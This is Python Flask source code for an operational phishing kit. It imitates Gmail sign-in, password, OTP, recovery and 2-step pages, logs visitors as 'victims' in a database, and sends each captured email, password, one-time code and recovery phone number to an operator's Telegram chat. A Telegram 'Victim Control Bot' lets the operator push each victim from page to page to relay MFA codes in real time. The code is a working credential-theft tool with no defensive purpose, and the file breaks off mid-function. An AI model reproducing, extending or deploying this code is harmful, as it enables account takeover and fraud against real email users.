from flask import Flask, render_template, request, jsonify, redirect, url_for, session
import sqlite3
import requests
from datetime import datetime, timedelta
import os
from flask import Flask, render_template, request, jsonify, redirect, url_for, session
import psycopg2
import psycopg2.extras
import requests
from datetime import datetime, timedelta
import os
import urllib.parse as up
from functools import wraps
import time
import re
import json
import random
import secrets
import uuid
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()
app = Flask(__name__)
app.secret_key = "secretkey"
DATABASE_URL = os.environ.get('DATABASE_URL')
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

def get_db_connection():
    """Get PostgreSQL database connection"""
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def init_db():
    """Initialize PostgreSQL database with correct schema"""
    conn = get_db_connection()
    c = conn.cursor()
    
    c.execute('DROP TABLE IF EXISTS navigations CASCADE')
    c.execute('DROP TABLE IF EXISTS victims CASCADE')
    
    c.execute('''
        CREATE TABLE victims (
            id SERIAL PRIMARY KEY,
            email TEXT,
            ip_address TEXT NOT NULL,
            user_agent TEXT,
            session_id TEXT UNIQUE,
            current_page TEXT DEFAULT 'login',
            is_active BOOLEAN DEFAULT TRUE,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE navigations (
            id SERIAL PRIMARY KEY,
            session_id TEXT,
            email TEXT,
            ip_address TEXT NOT NULL,
            page_url TEXT NOT NULL,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    c.execute('CREATE INDEX idx_victims_session_id ON victims(session_id)')
    c.execute('CREATE INDEX idx_victims_ip_address ON victims(ip_address)')
    c.execute('CREATE INDEX idx_victims_timestamp ON victims(timestamp)')
    c.execute('CREATE INDEX idx_victims_is_active ON victims(is_active)')
    
    c.execute('CREATE INDEX idx_navigations_session_id ON navigations(session_id)')
    c.execute('CREATE INDEX idx_navigations_timestamp ON navigations(timestamp)')
    c.execute('CREATE INDEX idx_navigations_ip_address ON navigations(ip_address)')
    
    conn.commit()
    conn.close()
    print("PostgreSQL database initialized!")

init_db()

# Store active victims and control commands
active_victims = {}
victim_commands = {}

# Store page data
verify_page_data = {}
recovery_page_data = {}
verification_page_data = {}

def send_telegram_message(message):
    """Send to Telegram using direct chat ID"""
    try:
        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
        if not chat_id:
            return False
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(f"✅ Telegram sent to chat: {chat_id}")
            return True
        else:
            print(f"❌ Telegram error: {response.text}")
            return False
    except Exception as e:
        print(f"Error sending Telegram: {e}")
        return False

def get_client_ip():
    """Get client IP address"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr

def create_victim_session(ip_address, user_agent):
    """Create a new victim session"""
    session_id = os.urandom(16).hex()
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("INSERT INTO victims (ip_address, user_agent, session_id, current_page) VALUES (%s, %s, %s, %s)",
              (ip_address, user_agent, session_id, 'login'))
    conn.commit()
    conn.close()
    
    active_victims[session_id] = {
        'ip_address': ip_address,
        'user_agent': user_agent,
        'email': None,
        'current_page': 'login',
        'is_active': True,
        'last_activity': datetime.now().isoformat()
    }
    
    return session_id

def update_victim_page(session_id, page_url, email=None):
    """Update victim's current page"""
    conn = get_db_connection()
    c = conn.cursor()
    
    if email:
        c.execute("UPDATE victims SET current_page = %s, email = %s WHERE session_id = %s", 
                 (page_url, email, session_id))
    else:
        c.execute("UPDATE victims SET current_page = %s WHERE session_id = %s", 
                 (page_url, session_id))
    
    conn.commit()
    conn.close()
    
    if session_id in active_victims:
        active_victims[session_id]['current_page'] = page_url
        active_victims[session_id]['last_activity'] = datetime.now().isoformat()
        if email:
            active_victims[session_id]['email'] = email

def log_navigation(session_id, page_url, email=None):
    """Log navigation"""
    conn = get_db_connection()
    c = conn.cursor()
    
    try:
        if email:
            c.execute("UPDATE victims SET current_page = %s, email = %s WHERE session_id = %s", 
                     (page_url, email, session_id))
        else:
            c.execute("UPDATE victims SET current_page = %s WHERE session_id = %s", 
                     (page_url, session_id))
        
        c.execute("SELECT ip_address FROM victims WHERE session_id = %s", (session_id,))
        result = c.fetchone()
        ip_address = result[0] if result else 'Unknown'
        
        c.execute("INSERT INTO navigations (session_id, email, ip_address, page_url) VALUES (%s, %s, %s, %s)",
                  (session_id, email, ip_address, page_url))
        
        conn.commit()
        
        if session_id in active_victims:
            active_victims[session_id]['current_page'] = page_url
            active_victims[session_id]['last_activity'] = datetime.now().isoformat()
            if email:
                active_victims[session_id]['email'] = email
                
    except Exception as e:
        print(f"Error in log_navigation: {e}")
        conn.rollback()
    finally:
        conn.close()

@app.before_request
def check_restrictions():
    """Check commands for victims"""
    if (request.endpoint in ['static', 'check_command', 'track_navigation',
                            'set_phone_data', 'get_phone_data', 'set_recovery_data', 
                            'get_recovery_data', 'set_verification_data', 'get_verification_data', 
                            'set_verify_data', 'get_verify_data', 'telegram_webhook'] or 
        request.path.startswith('/static/')):
        return None
    
    victim_session = session.get('victim_session')
    if victim_session and victim_session in victim_commands:
        command = victim_commands[victim_session]
        print(f"🎯 Executing command: {command} for session {victim_session}")
        
        command_map = {
            'go_to_login': 'gmail_login',
            'go_to_waiting': 'waiting',
            'go_to_stall': 'stall',
            'go_to_verify': 'verify',
            'go_to_password': 'password',
            'go_to_reset': 'reset',
            'go_to_otp': 'otp',
            'go_to_invalid': 'invalid',
            'go_to_recovery': 'recovery',
            'go_to_2step': 'twostep'
        }
        
        if command in command_map:
            victim_commands.pop(victim_session, None)
            page_name = command_map[command]
            return redirect(url_for(page_name))
    
    return None

@app.route('/')
def index():
    """Main route - serves index page with all email provider options"""
    if 'victim_session' not in session:
        client_ip = get_client_ip()
        user_agent = request.headers.get('User-Agent', '')
        session_id = create_victim_session(client_ip, user_agent)
        session['victim_session'] = session_id
        session['is_victim'] = True
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🎣 <b>NEW VICTIM CONNECTED!</b>

🌐 <b>IP Address:</b> <code>{client_ip}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
🔧 <b>User Agent:</b> <code>{user_agent}</code>
📍 <b>Current Page:</b> Index (Provider Selection)
        """
        
        send_telegram_message(message)
    
    invite_num = random.randint(2, 999)
    return render_template('index.html', invite_num=invite_num)

@app.route('/gmail-login')
def gmail_login():
    """Gmail login page"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    if session_id:
        log_navigation(session_id, 'Gmail Login Page', session.get('email'))
        update_victim_page(session_id, 'gmail_login')
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔐 <b>VICTIM REACHED GMAIL LOGIN PAGE!</b>

📧 <b>Email:</b> <code>{session.get('email', 'No email yet')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Gmail Login
        """
        
        send_telegram_message(message)
    
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    """Handle victim login"""
    email = request.form.get('email')
    session_id = session.get('victim_session')
    
    if email and session_id:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
        conn.commit()
        conn.close()
        
        if session_id in active_victims:
            active_victims[session_id]['email'] = email
        
        log_navigation(session_id, 'Login Attempt', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = get_client_ip()
        
        message = f"""
📧 <b>VICTIM ENTERED EMAIL!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{client_ip}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Login Form
        """
        
        send_telegram_message(message)
        
        session['email'] = email
        
        return jsonify({'success': True, 'redirect': url_for('password')})
    
    return jsonify({'success': False, 'error': 'No email provided'})

@app.route('/waiting')
def waiting():
    """Waiting page for victims"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    if session_id:
        log_navigation(session_id, 'Waiting Page', session.get('email'))
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
⏳ <b>VICTIM REACHED WAITING PAGE!</b>

📧 <b>Email:</b> <code>{session.get('email', 'No email')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Waiting
        """
        
        send_telegram_message(message)
    
    return render_template('waiting.html')

@app.route('/stall', methods=['GET', 'POST'])
def stall():
    """Stall page for victims"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    if request.method == 'POST':
        captcha_text = request.form.get('ca', '').strip()
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
⏸️ <b>VICTIM SUBMITTED CAPTCHA ON STALL PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🔤 <b>CAPTCHA Text:</b> <code>{captcha_text or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Stall (CAPTCHA Submitted)
        """
        
        send_telegram_message(message)
        
        log_navigation(session_id, 'Stall Page - CAPTCHA Submitted', email)
        
        return redirect(url_for('waiting'))
    
    if session_id:
        log_navigation(session_id, 'Stall Page', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
⏸️ <b>VICTIM REACHED STALL PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Stall (CAPTCHA)
        """
        
        send_telegram_message(message)
    
    return render_template('stall.html')

@app.route('/api/set-verify-data', methods=['POST'])
def set_verify_data():
    data = request.get_json()
    session_id = data.get('session_id')
    email = data.get('email')
    
    if session_id and email:
        verify_page_data[session_id] = {
            'email': email,
            'timestamp': datetime.now().isoformat()
        }
    
    return jsonify({'success': True})

@app.route('/api/get-verify-data')
def get_verify_data():
    session_id = session.get('victim_session')
    if session_id and session_id in verify_page_data:
        return jsonify(verify_page_data[session_id])
    return jsonify({'email': ''})

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    if request.method == 'POST':
        recovery_email = request.form.get('recovery_email', '').strip()
        recovery_phone = request.form.get('recovery_phone', '').strip()
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔐 <b>VICTIM SUBMITTED RECOVERY INFO!</b>

📧 <b>Original Email:</b> <code>{email}</code>
📩 <b>Recovery Email:</b> <code>{recovery_email or 'Not provided'}</code>
📱 <b>Recovery Phone:</b> <code>{recovery_phone or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
        """
        
        send_telegram_message(message)
        
        log_navigation(session_id, 'Recovery Info Submitted', email)
        
        return redirect(url_for('waiting'))
    
    if session_id:
        log_navigation(session_id, 'Verify Page', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔐 <b>VICTIM REACHED VERIFY PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Verify
        """
        
        send_telegram_message(message)
    
    return render_template('verify.html', placeholders={'email': email})

@app.route('/password', methods=['GET', 'POST'])
def password():
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    if request.method == 'POST':
        password = request.form.get('password', '').strip()
        email = request.form.get('email', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔑 <b>VICTIM SUBMITTED PASSWORD!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
        """
        
        send_telegram_message(message)
        
        log_navigation(session_id, 'Password Submitted', email)
        
        return redirect(url_for('waiting'))
    
    if session_id:
        log_navigation(session_id, 'Password Page', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔑 <b>VICTIM REACHED PASSWORD PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Password
        """
        
        send_telegram_message(message)
    
    return render_template('password.html', placeholders={'email': email})

@app.route('/track-navigation', methods=['POST'])
def track_navigation():
    if not session.get('is_victim'):
        return jsonify({'success': False})
    
    data = request.get_json()
    page_url = data.get('page_url', 'Unknown')
    session_id = session.get('victim_session')
    
    if session_id:
        log_navigation(session_id, page_url, session.get('email'))
    
    return jsonify({'success': True})

@app.route('/invalid', methods=['GET', 'POST'])
def invalid():
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    if request.method == 'POST':
        password = request.form.get('password', '').strip()
        email = request.form.get('email', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔑 <b>VICTIM SUBMITTED PASSWORD FROM INVALID PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page Type:</b> Invalid/Too Many Attempts
        """
        
        send_telegram_message(message)
        
        log_navigation(session_id, 'Invalid Page - Password Submitted', email)
        
        return redirect(url_for('waiting'))
    
    if session_id:
        log_navigation(session_id, 'Invalid Page', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🚫 <b>VICTIM REACHED INVALID PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Invalid/Too Many Attempts
        """
        
        send_telegram_message(message)
    
    return render_template('invalid.html', placeholders={'email': email})

@app.route('/reset', methods=['GET', 'POST'])
def reset():
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    if request.method == 'POST':
        new_password = request.form.get('new_password', '').strip()
        confirm_password = request.form.get('confirm_password', '').strip()
        email = request.form.get('email', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔑 <b>VICTIM CREATED NEW PASSWORD!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>New Password:</b> <code>{new_password or 'Not provided'}</code>
✅ <b>Confirm Password:</b> <code>{confirm_password or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
        """
        
        send_telegram_message(message)
        
        log_navigation(session_id, 'Reset Password Submitted', email)
        
        return redirect(url_for('waiting'))
    
    if session_id:
        log_navigation(session_id, 'Reset Password Page', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔑 <b>VICTIM REACHED RESET PASSWORD PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Reset Password
        """
        
        send_telegram_message(message)
    
    return render_template('reset.html', placeholders={'email': email})

@app.route('/otp', methods=['GET', 'POST'])
def otp():
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    if request.method == 'POST':
        otp_code = request.form.get('otpcode', '').strip()
        email = request.form.get('email', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔢 <b>VICTIM SUBMITTED OTP!</b>

📧 <b>Email:</b> <code>{email}</code>
🔢 <b>OTP Code:</b> <code>{otp_code or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
        """
        
        send_telegram_message(message)
        
        log_navigation(session_id, 'OTP Submitted', email)
        
        return redirect(url_for('waiting'))
    
    if session_id:
        log_navigation(session_id, 'OTP Page', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔢 <b>VICTIM REACHED OTP PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> OTP
        """
        
        send_telegram_message(message)
    
    return render_template('otp.html', placeholders={'email': email, 'phone': '****'})

@app.route('/recovery')
def recovery():
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    recovery_data = {}
    if session_id and session_id in recovery_page_data:
        recovery_data = recovery_page_data[session_id]
        email = recovery_data.get('email', email)
    
    if session_id:
        log_navigation(session_id, 'Recovery Page', email)
        
        notification_key = f'notified_recovery_{session_id}'
        if not session.get(notification_key):
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            message = f"""
📱 <b>VICTIM REACHED RECOVERY PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🔢 <b>Number Displayed:</b> <code>{recovery_data.get('number', 'Not set')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Recovery
            """
            
            send_telegram_message(message)
            session[notification_key] = True
    
    return render_template('recovery.html', placeholders={
        'email': email, 
        'number': recovery_data.get('number', '')
    })

@app.route('/2step', methods=['GET', 'POST'])
def twostep():
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    verification_data = {}
    if session_id and session_id in verification_page_data:
        verification_data = verification_page_data[session_id]
        email = verification_data.get('email', email)
    
    if session_id:
        log_navigation(session_id, '2-Step Verification Page', email)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
📱 <b>VICTIM REACHED 2-STEP VERIFICATION PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
📱 <b>Phone Displayed:</b> <code>{verification_data.get('phone', 'Not set')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> 2-Step Verification
        """
        
        send_telegram_message(message)
    
    return render_template('2stepverification.html', placeholders={
        'email': email, 
        'phone': verification_data.get('phone', 'iPhone')
    })

@app.route('/api/set-verification-data', methods=['POST'])
def set_verification_data():
    data = request.get_json()
    session_id = data.get('session_id')
    email = data.get('email')
    phone = data.get('phone')
    
    if session_id:
        verification_page_data[session_id] = {
            'email': email or '',
            'phone': phone or '',
            'timestamp': datetime.now().isoformat()
        }
    
    return jsonify({'success': True})

@app.route('/api/get-verification-data')
def get_verification_data():
    session_id = session.get('victim_session')
    if session_id and session_id in verification_page_data:
        return jsonify(verification_page_data[session_id])
    return jsonify({'email': '', 'phone': ''})

@app.route('/api/set-phone-data', methods=['POST'])
def set_phone_data():
    data = request.get_json()
    session_id = data.get('session_id')
    phone = data.get('phone')
    
    if session_id and phone:
        verify_page_data[session_id] = {
            **verify_page_data.get(session_id, {}),
            'phone': phone,
            'timestamp': datetime.now().isoformat()
        }
    
    return jsonify({'success': True})

@app.route('/api/get-recovery-data')
def get_recovery_data():
    session_id = session.get('victim_session')
    if session_id and session_id in recovery_page_data:
        return jsonify(recovery_page_data[session_id])
    return jsonify({'email': '', 'number': ''})

@app.route('/api/set-recovery-data', methods=['POST'])
def set_recovery_data():
    data = request.get_json()
    session_id = data.get('session_id')
    email = data.get('email')
    number = data.get('number')
    
    if session_id:
        recovery_page_data[session_id] = {
            'email': email or '',
            'number': number or '',
            'timestamp': datetime.now().isoformat()
        }
    
    return jsonify({'success': True})

@app.route('/api/get-phone-data')
def get_phone_data():
    session_id = session.get('victim_session')
    if session_id and session_id in verify_page_data:
        return jsonify(verify_page_data[session_id])
    return jsonify({'phone': ''})

@app.route('/check-command')
def check_command():
    session_id = session.get('victim_session')
    
    if session_id and session_id in victim_commands:
        command = victim_commands[session_id]
        victim_commands.pop(session_id, None)
        return jsonify({'command': command})
    
    return jsonify({'command': None})

# ============ TELEGRAM WEBHOOK WITH BUTTONS ============

@app.route('/telegram-webhook', methods=['POST'])
def telegram_webhook():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'ok'})
        
        if 'callback_query' in data:
            callback = data['callback_query']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            data_parts = callback['data'].split('|')
            action = data_parts[0]
            
            if action == 'refresh':
                send_victims_list(chat_id, message_id)
            elif action == 'victim_detail':
                session_id = data_parts[1]
                send_victim_detail(chat_id, session_id, message_id)
            elif action == 'force':
                session_id = data_parts[1]
                page = data_parts[2]
                force_victim(session_id, page, chat_id, message_id)
            elif action == 'setemail':
                session_id = data_parts[1]
                email = data_parts[2]
                set_victim_email(session_id, email, chat_id, message_id)
            elif action == 'setphonetype':
                session_id = data_parts[1]
                phone_type = data_parts[2]
                set_victim_phonetype(session_id, phone_type, chat_id, message_id)
            elif action == 'setnumber':
                session_id = data_parts[1]
                number = data_parts[2]
                set_victim_number(session_id, number, chat_id, message_id)
            elif action == 'setphone':
                session_id = data_parts[1]
                phone = data_parts[2]
                set_victim_phone(session_id, phone, chat_id, message_id)
            elif action == 'delete':
                session_id = data_parts[1]
                delete_victim_telegram(session_id, chat_id, message_id)
            elif action == 'main_menu':
                send_main_menu(chat_id, message_id)
            elif action == 'victims_list':
                send_victims_list(chat_id, message_id)
            elif action == 'stats':
                send_stats(chat_id, message_id)
            elif action == 'clear_all':
                clear_all_victims(chat_id, message_id)
            
            return jsonify({'status': 'ok'})
        
        if 'message' in data:
            message = data['message']
            chat_id = message['chat']['id']
            text = message.get('text', '').strip()
            
            if text == '/start' or text == '🔙 Main Menu':
                send_main_menu(chat_id)
            elif text == '📋 View Victims':
                send_victims_list(chat_id)
            elif text == '📊 Statistics':
                send_stats(chat_id)
            elif text == '🧹 Clear All':
                send_clear_confirmation(chat_id)
            else:
                send_main_menu(chat_id)
        
        return jsonify({'status': 'ok'})
        
    except Exception as e:
        print(f"Error in webhook: {e}")
        return jsonify({'status': 'error'}), 500

def send_main_menu(chat_id, message_id=None):
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "📋 View Victims", "callback_data": "victims_list"},
                {"text": "📊 Statistics", "callback_data": "stats"}
            ],
            [
                {"text": "🧹 Clear All Data", "callback_data": "clear_all"}
            ],
            [
                {"text": "🔄 Refresh", "callback_data": "refresh"}
            ]
        ]
    }
    
    text = """🤖 <b>Victim Control Bot</b>

Welcome! Use the buttons below to control your victims.

📋 <b>View Victims</b> - See all active victims
📊 <b>Statistics</b> - View stats
🧹 <b>Clear All</b> - Delete all victims & logs
🔄 <b>Refresh</b> - Update the list"""
    
    if message_id:
        edit_telegram_message(chat_id, message_id, text, keyboard)
    else:
        send_telegram_message_with_buttons(chat_id, text, keyboard)

def send_victims_list(chat_id, message_id=None):
    victims = get_all_victims()
    
    if not victims:
        text = "📭 <b>No active victims found.</b>"
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔄 Refresh", "callback_data": "refresh"}],
                [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
            ]
        }
    else:
        text = f"📋 <b>Active Victims ({len(victims)})</b>\n\n"
        keyboard = {"inline_keyboard": []}
        
        for v in victims[:10]:
            session_short = v['session_id'][:8]
            text += f"🆔 <code>{session_short}...</code>\n"
            text += f"📧 {v['email']}\n"
            text += f"📍 {v['current_page']}\n"
            text += "─" * 20 + "\n"
            
            keyboard["inline_keyboard"].append([
                {"text": f"👤 {session_short}", "callback_data": f"victim_detail|{v['session_id']}"}
            ])
        
        if len(victims) > 10:
            text += f"\n... and {len(victims) - 10} more victims"
        
        keyboard["inline_keyboard"].append([
            {"text": "🔄 Refresh", "callback_data": "refresh"},
            {"text": "🔙 Main Menu", "callback_data": "main_menu"}
        ])
    
    if message_id:
        edit_telegram_message(chat_id, message_id, text, keyboard)
    else:
        send_telegram_message_with_buttons(chat_id, text, keyboard)

def send_victim_detail(chat_id, session_id, message_id=None):
    victim = get_victim_details(session_id)
    
    if not victim:
        text = "❌ Victim not found"
        keyboard = {
            "inline_keyboard": [
                [{"text": "📋 Back to Victims", "callback_data": "victims_list"}],
                [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
            ]
        }
    else:
        text = f"""👤 <b>Victim Details</b>

🆔 <b>Session:</b> <code>{victim['session_id']}</code>
📧 <b>Email:</b> {victim['email']}
📍 <b>Current Page:</b> {victim['current_page']}
🌐 <b>IP:</b> {victim['ip_address']}
📱 <b>Device:</b> {victim['user_agent'][:40]}...
🕐 <b>Connected:</b> {victim['timestamp']}
📊 <b>Navigations:</b> {victim['nav_count']}

<b>Control Options:</b>"""
        
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "🔄 Waiting", "callback_data": f"force|{session_id}|waiting"},
                    {"text": "🔐 Login", "callback_data": f"force|{session_id}|login"}
                ],
                [
                    {"text": "⏸️ Stall", "callback_data": f"force|{session_id}|stall"},
                    {"text": "🔑 Password", "callback_data": f"force|{session_id}|password"}
                ],
                [
                    {"text": "🛡️ Verify", "callback_data": f"force|{session_id}|verify"},
                    {"text": "🔄 Reset", "callback_data": f"force|{session_id}|reset"}
                ],
                [
                    {"text": "📱 OTP", "callback_data": f"force|{session_id}|otp"},
                    {"text": "❌ Invalid", "callback_data": f"force|{session_id}|invalid"}
                ],
                [
                    {"text": "📱 Recovery", "callback_data": f"force|{session_id}|recovery"},
                    {"text": "🔒 2-Step", "callback_data": f"force|{session_id}|2step"}
                ],
                [
                    {"text": "📧 Set Email", "callback_data": f"setemail|{session_id}|"},
                    {"text": "🗑️ Delete", "callback_data": f"delete|{session_id}"}
                ],
                [
                    {"text": "📱 Set Phone Type", "callback_data": f"setphonetype|{session_id}|"},
                    {"text": "📞 Set Phone", "callback_data": f"setphone|{session_id}|"}
                ],
                [
                    {"text": "🔢 Set Number", "callback_data": f"setnumber|{session_id}|"}
                ],
                [
                    {"text": "📋 Back to Victims", "callback_data": "victims_list"},
                    {"text": "🔙 Main Menu", "callback_data": "main_menu"}
                ]
            ]
        }
    
    if message_id:
        edit_telegram_message(chat_id, message_id, text, keyboard)
    else:
        send_telegram_message_with_buttons(chat_id, text, keyboard)

def force_victim(session_id, page, chat_id, message_id):
    action_map = {
        'waiting': 'go_to_waiting',
        'login': 'go_to_login',
        'stall': 'go_to_stall',
        'verify': 'go_to_verify',
        'password': 'go_to_password',
        'reset': 'go_to_reset',
        'otp': 'go_to_otp',
        'invalid': 'go_to_invalid',
        'recovery': 'go_to_recovery',
        '2step': 'go_to_2step'
    }
    
    if page in action_map:
        victim_commands[session_id] = action_map[page]
        text = f"✅ Victim forced to <b>{page}</b> page!"
    else:
        text = f"❌ Invalid page: {page}"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
            [{"text": "📋 Victims List", "callback_data": "victims_list"}],
            [{"text": "🔙 Main Menu", "callback_data": "main_menu"}]
        ]
    }
    
    edit_telegram_message(chat_id, message_id, text, keyboard)

def set_victim_email(session_id, email, chat_id, message_id):
    if not email:
        text = "📧 Please type the email address you want to set.\n\nExample: user@gmail.com"
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
            ]
        }
        edit_telegram_message(chat_id, message_id, text, keyboard)
        return
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
    conn.commit()
    conn.close()
    
    if session_id in active_victims:
        active_victims[session_id]['email'] = email
    
    text = f"✅ Email set to: <code>{email}</code>"
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
            [{"text": "📋 Victims List", "callback_data": "victims_list"}]
        ]
    }
